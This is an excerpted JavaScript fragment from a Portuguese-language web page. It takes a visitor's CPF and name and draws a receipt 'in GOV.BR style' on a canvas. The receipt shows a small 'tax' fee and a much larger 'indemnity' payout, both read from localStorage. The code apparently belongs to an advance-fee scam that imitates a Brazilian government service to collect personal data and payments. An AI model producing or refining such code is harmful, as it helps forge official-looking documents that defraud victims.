...
async function prefetchComprovante() {
  ...
  // Valor dinâmico da taxa (checkout_plan_amount em centavos → reais com vírgula)
  const amountCents = parseInt(localStorage.getItem('checkout_plan_amount') || '6190', 10);
  const amountReais = (amountCents / 100).toLocaleString('pt-BR', { minimumFractionDigits: 2, maximumFractionDigits: 2 });

  // Valor dinâmico da indenização a receber (checkout_plan_ganho em centavos → reais)
  const ganhoCents = parseInt(localStorage.getItem('checkout_plan_ganho') || '596000', 10);
  const ganhoReais = (ganhoCents / 100).toLocaleString('pt-BR', { minimumFractionDigits: 2, maximumFractionDigits: 2 });

  const cacheKey = `${cpf}|${name}|${dataHoje}|${amountCents}|${ganhoCents}`;
  if (_comprovanteCache.key === cacheKey && _comprovanteCache.src) {
    console.log('[Comprovante] 📦 Usando cache');
    return _comprovanteCache.src;
  }

  // Gera o comprovante localmente via Canvas — estilo GOV.BR (sem API externa)
  console.log('[Comprovante] 🖊️ Gerando localmente...');
  const src = gerarComprovanteLocal({
    nome: name,
    cpf: cpf,
    data: dataHoje,
    imposto: amountReais,
    indenizacao: ganhoReais
  });

  console.log('[Comprovante] ✅ Comprovante gerado com sucesso');
...
document.addEventListener('DOMContentLoaded', function () {
  ...
  // Formata CPF (só se houver input — algumas páginas reusam este JS sem o form)
  if (cpfInput) {
  ...
  // Submit (só se houver form com input CPF)
  if (form && cpfInput) form.addEventListener('submit', async function (e) {
    e.preventDefault();
